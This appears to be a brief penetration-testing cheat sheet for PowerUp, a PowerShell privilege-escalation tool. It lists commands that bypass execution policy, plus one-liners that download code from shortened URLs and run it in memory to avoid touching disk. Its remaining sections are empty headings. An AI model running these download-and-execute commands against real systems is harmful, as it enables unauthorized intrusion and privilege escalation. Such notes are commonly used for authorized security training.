---
title: "Powerup"
source_url: https://x3m1sec.gitbook.io/notes/resources/cheat-sheets/powerup
fetched_at: 2026-09-20T07:24:55Z
license: unspecified
category: windows
---

## Initial Execution

```
# Load from disk
Powershell.exe -nop -exec bypass
. .\powerup.ps1
# Load from Github
Powershell IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/1PdjSHk")
# Invoke-AllChecks
Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
# Invoke-AllChecks and load script in one command
powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}
# Invoke-AllChecks without touching disk
 powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
```
## Commands

### Miscellaneous

### Services

### Registry

## References

Last updated
